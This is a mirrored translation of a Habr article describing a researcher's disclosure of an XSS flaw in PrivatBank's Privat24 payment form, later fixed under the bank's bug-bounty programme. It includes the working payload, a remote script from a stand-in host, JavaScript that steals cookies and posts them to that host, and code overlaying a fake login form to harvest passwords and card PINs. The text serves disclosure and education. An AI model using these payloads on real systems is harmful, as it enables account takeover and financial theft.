<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How does the program "Search for IT vulnerabilities" PrivatBank</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The largest bank of Ukraine Privatbank announced that ‚ÄúPrivatBank will pay 10,000 UAH. for the found vulnerabilities in Privat24 ‚Äù . And information o...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How does the program "Search for IT vulnerabilities" PrivatBank</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/bcb/2b9/5e1/bcb2b95e1a5f2081657dc1058f33473d.jpg" align="right"><br>  The largest bank of Ukraine <a href="http://privatbank.ua/">Privatbank</a> announced that <a href="http://macstore.org.ua/app-store-prilozheniya/privatbank-zaplatit-10000-grn-za-naydennie-uyazvimosti-v-privat24.html">‚ÄúPrivatBank will pay 10,000 UAH.</a>  <a href="http://macstore.org.ua/app-store-prilozheniya/privatbank-zaplatit-10000-grn-za-naydennie-uyazvimosti-v-privat24.html">for the found vulnerabilities in Privat24 ‚Äù</a> .  And information <a href="http://privatbank.ua/safeness/">on the bank site</a> . <br><br>  Having learned about this, I remembered the XSS vulnerability, which I discovered and wrote about it in a private chat to the operator Privat24 half a year ago.  Googling about this wonderful news saw an article on Habr√© <a href="http://habrahabr.ru/post/193204/">‚ÄúPrivatBank accused the Ukrainian programmer of hacking into its Android application‚Äù</a> . <br><br>  Interesting and scary at the same time.  Look for us vulnerabilities and we will blame you for hacking! 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Having decided that I did not violate any rules of Privatbank, I went to check the old vulnerability, and (for some reason I did not doubt) nobody corrected it. <br><a name="habracut"></a><br>  On the official website of the bank there is <a href="https://api.privatbank.ua/article/4/">an example of the code of the form</a> for Internet acquiring. <br><br><pre><code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">action</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://api.privatbank.ua/p24api/ishop"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">method</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"POST"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"amt"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">""</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ccy"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">" (UAH / USD / EUR)"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"merchant"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ID "</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"order"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"  "</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"details"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">" "</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ext_details"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"  ( ,  ..) /  /"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"pay_way"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"privat24"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"return_url"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">",    "</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server_url"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">",   API   "</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"submit"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">""</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><br>  Substituting in the details field: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"details"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"test&lt;script&gt;alert('xss');&lt;/script&gt;"</span></span></span><span class="hljs-tag"> /&gt;</span></span></code> </pre><br><br>  And having sent the form, the user goes to the PrivatBank payment page on which XSS is executed: <br><br>  The original page looks like this: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e91/947/e83/e91947e838d35bb91c393436716b028c.png"><br><br>  It runs our alert (): <br><br>  <b>in firefox:</b> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/00d/eb8/a9b/00deb8a9bbe7ba097b35dd223f2098ca.png"><br><br>  <b>in chrome:</b> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1b6/f76/d97/1b6f76d979fe577bf5b26cfebf8dbae7.png"><br><br>  <b>in IE10:</b> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/15d/5bf/88d15d5bfb5c8e1ff5da1d086f1cf018.png"><br><br>  Go ahead and load javascript from a remote host: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"details"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"test&lt;script src='http://fake-site.com/p.js'&gt;&lt;/script&gt;"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre><br><br>  And we get the error: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/18a/d1e/68e/18ad1e68e49361ed4c0789848e25bb12.png"><br><br>  <font color="red">The page at 'https: //api.privatbank.ua/p24api/ishop? Pid = .....' was loaded over HTTPS, but ranged insecure content from 'http://fake-site.com/p.js ': this content should also be loaded over HTTPS.</font> <br><br>  We fix and try again: <br><br><pre> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"details"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"test&lt;script src='https://fake-site.com/p.js'&gt;&lt;/script&gt;"</span></span></span><span class="hljs-tag">/&gt;</span></span></code> </pre><br><br>  Works!  (The main thing is that the certificate must be valid and not self-signed). <br><br>  The deleted js file is executed: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/827/d80/c43/827d80c43f67d81af64636857cec32c9.png"><br><br>  Then the first thing that comes to mind is to send users' cookies to fake-site.com. <br><br>  To do this, add to our p.js: <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getCookies</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> cookies = {}; <span class="hljs-comment"><span class="hljs-comment">// The object we will return var all = document.cookie; // Get all cookies in one big string if (all === "") // If the property is the empty string return cookies; // return an empty object var list = all.split("; "); // Split into individual name=value pairs for(var i = 0; i &lt; list.length; i++) { // For each cookie var cookie = list[i]; var p = cookie.indexOf("="); // Find the first = sign var name = cookie.substring(0,p); // Get cookie name var value = cookie.substring(p+1); // Get cookie value value = decodeURIComponent(value); // Decode the value cookies[name] = value; // Store name and value in object } return cookies; } $.post("https://fake-site.com/p.php", getCookies());</span></span></code> </pre><br><br>  We use jQuery only because it is available on the bank page. <br><br>  We get cookies, send them to the fake site and see the error: <br><br><img src="//habrastorage.org/files/f15/606/313/f156063137d24285a198a113f1c7a30a.png"><br><br>  <font color="red">XMLHttpRequest cannot load 'http://fake-site.com/p.php'.</font>  <font color="red">No 'Access-Control-Allow-Origin' header is present on the requested resource.</font>  <font color="red">Origin 'https: //api.privatbank.ua ......' is therefore not allowed access.</font> <br><br>  <a href="http://ru.wikipedia.org/wiki/Cross-origin_resource_sharing">Fix</a> in p.php: <br><br><pre> <code class="php hljs">header(<span class="hljs-string"><span class="hljs-string">"Access-Control-Allow-Origin: *"</span></span>);</code> </pre><br><br>  And the requests went. <br><br>  We don‚Äôt stop there and try to change the page so that the user re-entered his phone number, password from the bank‚Äôs client. <br><br>  Modify p.js like this: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> html = ‚Äù...   css  html..‚Äù; $(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ a(); }); <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">a</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span>{ $(<span class="hljs-string"><span class="hljs-string">".pr_block"</span></span>).find(<span class="hljs-string"><span class="hljs-string">".pr_password"</span></span>).addClass(<span class="hljs-string"><span class="hljs-string">"fake"</span></span>).removeClass(<span class="hljs-string"><span class="hljs-string">"pr_password"</span></span>).html(html); $(<span class="hljs-string"><span class="hljs-string">".bt_cancel"</span></span>).hide(); $(<span class="hljs-string"><span class="hljs-string">".bt_login"</span></span>).hide(); }</code> </pre><br><br>  Hide the payment code entry field and show the authorization form: <br><br><img src="//habrastorage.org/files/dc0/e44/6c4/dc0e446c4e43454fa01700fa8e8b49a6.png"><br><br>  You can also show the access recovery form (if the user enters the password 3 times incorrectly, he sees this form): <br><br><img src="//habrastorage.org/files/759/d91/d23/759d91d23fbc4ea8bf80e7d25961f227.png"><br><br>  By displaying this form on a bank page, an attacker can get his password, phone number, and postal address from a user.  Further, when recovering the password, the bank sends the password to the mobile phone and only AFTER it is entered, the user sees the form for entering the card‚Äôs PIN code, but since this form is fake, no one will send the passwords and the user will immediately see the form for entering the PIN code: <br><br><img src="//habrastorage.org/files/529/267/802/5292678026174afba07bcb431ee94944.png"><br><br>  As a result, we have the last 4 digits of the user's card and the pin code for it. <br><br>  From the form of payment we have a list of all user cards: <br><br><img src="//habrastorage.org/files/955/3d9/976/9553d997669a4604a5832f23333f52d0.png"><br><br>  Accordingly, the attacker knows the full card number and pin code from this card as well as the user's full name, his phone number, password from Privat24, numbers and balances of all his cards instituted in Privat24. <br><br>  It remains to run any website with payment through Privat24, sell any product with huge discounts and collect user data. <br><br>  But since we are honest citizens, this vulnerability was once again reported to the <a href="http://privatbank.ua/safeness/">‚ÄúSearch for IT-vulnerabilities‚Äù</a> department and such answers were received (Before receiving each letter from PrivatBank, I send them inquiries): <br><br>  <b>1) February 13, 2014</b> <br>  Good day! <br>  Your signal in the form of payment Privat24 taken to work. <br>  Thanks for the signal!  We will inform you about the results by a separate message! <br><br>  <b>2) February 20, 2014</b> <br>  Good day! <br>  The vulnerability is not yet closed, developers are working to eliminate it. <br>  Please wait for a while and not publish information about this vulnerability.  We will inform you about its elimination.  We consider the signals within 7 days, but, unfortunately, the removal of vulnerabilities takes more time (given the fact that there are a lot of signals). <br>  Thank you for understanding! <br><br>  <b>3) March 12, 2014</b> <br>  Good day! <br>  The vulnerability that you indicated has already worked.  Changes made and tested on the test server Privat24.  Expected to post a revised version of the combat server. <br>  We inform that for this signal you will be paid a monetary reward (estimated amount - 1500 UAH). Please inform the number of your ‚ÄúUniversal‚Äù card for which the payment will be made.  Payment will be made in early April.  Before making the payment please do not disclose information about this vulnerability.  Thank! <br><br>  <b>4) April 18, 2014</b> <br>  Good day! <br>  At the moment, all payments by the bank in Crimea are suspended due to the uncertainty of the political situation regarding the banking sector in this region. <br>  Thank you for understanding! <br><br>  Further actions were not conducted, all studies were conducted on your account as required by the ‚ÄúTerms and Conditions‚Äù of the bank: <br><br><img src="//habrastorage.org/files/f44/b60/5d0/f44b605d0acc45b68e4d602243d9d74d.png"><br><br>  <b>Today checked - vulnerability fixed!</b> <br><br>  PS The final answer from PrivatBank. <br><br>  Good day! <br>  As it was agreed, as a reward for you for the revealed vulnerability in Privat24, a charitable payment in the amount of 1500 UAH was made on your behalf by PrivatBank: <a href="https://ubb.org.ua/ru/project/929/">ubb.org.ua/ru/project/929/#tabs-1</a> <br><br>  We are waiting for new effective signals about the vulnerabilities of our resources. <br>  Thank you for your cooperation! <br><br>  It is very pleasant that in the current difficult situation in the country, PrivatBank has fulfilled its obligations under the program. </div><p>Source: <a href="https://habr.com/ru/post/220539/">https://habr.com/ru/post/220539/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../220527/index.html">Patch for the hypervisor of consciousness</a></li>
<li><a href="../220529/index.html">How to DPAA driver</a></li>
<li><a href="../220531/index.html">WiFi Led Controller Device Study</a></li>
<li><a href="../220533/index.html">Samsung Galaxy S5: the flagship created in a hurry</a></li>
<li><a href="../220537/index.html">Installing Tizen 3.0 on RD-PQ</a></li>
<li><a href="../220541/index.html">HP ProLiant Workshop with 65% discount - May 6-7 in Kiev</a></li>
<li><a href="../220543/index.html">Search VPS - second update: auctions, a place for backups, licenses and reviews about hosts</a></li>
<li><a href="../220547/index.html">Sweet couple from the publisher Peter</a></li>
<li><a href="../220549/index.html">What does ‚Äútoo expensive‚Äù mean?</a></li>
<li><a href="../220551/index.html">Passed GTA - started down the player!</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>